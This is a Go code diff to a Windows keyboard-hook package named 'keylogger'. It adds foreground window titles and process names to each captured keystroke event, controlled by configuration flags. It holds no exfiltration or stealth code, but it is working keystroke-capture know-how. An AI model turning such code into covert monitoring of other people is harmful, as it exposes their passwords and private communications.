@@ -5,6 +5,7 @@ package keylogger
 import (
 	"context"
 	"fmt"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
@@ -13,16 +14,24 @@ import (
 	"unsafe"
 
 	"github.com/lxn/win"
+	"golang.org/x/sys/windows"
 )
 
 type windowsProvider struct{}
 
 type windowsHookSession struct {
-	ctx       context.Context
-	cancel    context.CancelFunc
-	stream    *channelEventStream
-	modifiers *windowsModifierState
-	hook      windowsHookHandle
+	ctx           context.Context
+	cancel        context.CancelFunc
+	stream        *channelEventStream
+	modifiers     *windowsModifierState
+	hook          windowsHookHandle
+	config        StartConfig
+	lastHwnd      win.HWND
+	lastTitle     string
+	lastProcess   string
+	lastPID       uint32
+	processCache  map[uint32]string
+	cacheMu       sync.Mutex
 }
 
 var (
@@ -38,12 +47,30 @@ const (
 )
 
 var (
-	user32                  = syscall.NewLazyDLL("user32.dll")
-	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
-	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
-	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
-	procPostThreadMessageW  = user32.NewProc("PostThreadMessageW")
+	user32                        = syscall.NewLazyDLL("user32.dll")
+	procSetWindowsHookExW         = user32.NewProc("SetWindowsHookExW")
+	procCallNextHookEx            = user32.NewProc("CallNextHookEx")
+	procUnhookWindowsHookEx       = user32.NewProc("UnhookWindowsHookEx")
+	procPostThreadMessageW        = user32.NewProc("PostThreadMessageW")
+	procGetWindowTextLengthW      = user32.NewProc("GetWindowTextLengthW")
+	procGetWindowTextW            = user32.NewProc("GetWindowTextW")
+	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
+	procQueryFullProcessImageName = kernel32.NewProc("QueryFullProcessImageNameW")
 )
+
+func getWindowTextLength(hwnd win.HWND) int {
+	ret, _, _ := procGetWindowTextLengthW.Call(uintptr(hwnd))
+	return int(ret)
+}
+
+func getWindowText(hwnd win.HWND, buf *uint16, maxCount int32) int {
+	ret, _, _ := procGetWindowTextW.Call(
+		uintptr(hwnd),
+		uintptr(unsafe.Pointer(buf)),
+		uintptr(maxCount),
+	)
+	return int(ret)
+}
 
 func setWindowsHookEx(idHook int32, callback uintptr, module win.HINSTANCE, threadID uint32) (windowsHookHandle, error) {
 	ret, _, err := procSetWindowsHookExW.Call(
@@ -102,10 +129,12 @@ func (p *windowsProvider) Start(ctx context.Context, cfg StartConfig) (EventStre
 
 	sessionCtx, cancel := context.WithCancel(ctx)
 	session := &windowsHookSession{
-		ctx:       sessionCtx,
-		cancel:    cancel,
-		stream:    stream,
-		modifiers: &windowsModifierState{},
+		ctx:          sessionCtx,
+		cancel:       cancel,
+		stream:       stream,
+		modifiers:    &windowsModifierState{},
+		config:       normalized,
+		processCache: make(map[uint32]string),
 	}
 
 	ready := make(chan error, 1)
@@ -211,6 +240,82 @@ func (s *windowsHookSession) run(ready chan<- error) {
 	}
 }
 
+func (s *windowsHookSession) getProcessName(pid uint32) string {
+	if pid == 0 {
+		return ""
+	}
+
+	s.cacheMu.Lock()
+	if name, ok := s.processCache[pid]; ok {
+		s.cacheMu.Unlock()
+		return name
+	}
+	s.cacheMu.Unlock()
+
+	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
+	if err != nil {
+		return ""
+	}
+	defer windows.CloseHandle(handle)
+
+	buf := make([]uint16, windows.MAX_PATH)
+	size := uint32(len(buf))
+	ret, _, _ := procQueryFullProcessImageName.Call(
+		uintptr(handle),
+		0,
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(unsafe.Pointer(&size)),
+	)
+
+	if ret == 0 {
+		return ""
+	}
+
+	name := filepath.Base(syscall.UTF16ToString(buf[:size]))
+	s.cacheMu.Lock()
+	if len(s.processCache) > 100 {
+		for k := range s.processCache {
+			delete(s.processCache, k)
+			break
+		}
+	}
+	s.processCache[pid] = name
+	s.cacheMu.Unlock()
+
+	return name
+}
+
+func (s *windowsHookSession) getForegroundWindowInfo() (string, string) {
+	hwnd := win.GetForegroundWindow()
+	if hwnd == 0 {
+		return "", ""
+	}
+
+	if hwnd == s.lastHwnd {
+		return s.lastTitle, s.lastProcess
+	}
+
+	var pid uint32
+	win.GetWindowThreadProcessId(hwnd, &pid)
+
+	title := ""
+	titleLen := getWindowTextLength(hwnd)
+	if titleLen > 0 {
+		buf := make([]uint16, titleLen+1)
+		getWindowText(hwnd, &buf[0], int32(len(buf)))
+		title = syscall.UTF16ToString(buf)
+	}
+
+	process := s.getProcessName(pid)
+
+	s.lastHwnd = hwnd
+	s.lastTitle = title
+	s.lastProcess = process
+	s.lastPID = pid
+
+	return title, process
+}
+
 func (s *windowsHookSession) emit(pressed bool, data *kbdLLHook) {
 	if data == nil {
 		return
@@ -233,6 +338,16 @@ func (s *windowsHookSession) emit(pressed bool, data *kbdLLHook) {
 		Ctrl:      ctrl,
 		Shift:     shift,
 		Meta:      meta,
+	}
+
+	if s.config.IncludeWindowTitle || s.config.EmitProcessNames {
+		title, process := s.getForegroundWindowInfo()
+		if s.config.IncludeWindowTitle {
+			event.WindowTitle = title
+		}
+		if s.config.EmitProcessNames {
+			event.ProcessName = process
+		}
 	}
 
 	if pressed {
